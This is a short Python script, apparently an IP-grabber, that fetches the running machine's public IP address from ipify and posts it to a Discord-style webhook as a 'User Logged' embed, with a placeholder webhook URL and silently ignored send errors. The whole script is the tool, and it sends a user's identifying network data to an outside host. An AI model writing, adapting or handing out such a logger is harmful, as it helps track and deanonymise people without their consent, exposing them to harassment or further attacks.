import requests, logging, datetime

def get_ip():
    try:
        headers = {
            'User-Agent': 'MyCustomUserAgent/1.0'
        }
        response = requests.get('https://api64.ipify.org?format=json', headers=headers)
        data = response.json()
        return data.get('ip')
    except Exception as e:
        logging.error("Error getting public IP: %s", e)
        return None

def send_to_webhook(webhook_url, ip_address):
    try:
        embed = {
            "title": "User Logged:",
            "description": f"User IP Address: {ip_address}",
            "timestamp": datetime.datetime.now().isoformat(),
            "color": 16711680
        }

        data = {
            "embeds": [embed]
        }

        requests.post(webhook_url, json=data)
        
    except Exception as e:
        pass

if __name__ == "__main__":
    webhook_url = "webhook here"
    user_ip = get_ip()
    if user_ip:
        send_to_webhook(webhook_url, user_ip)
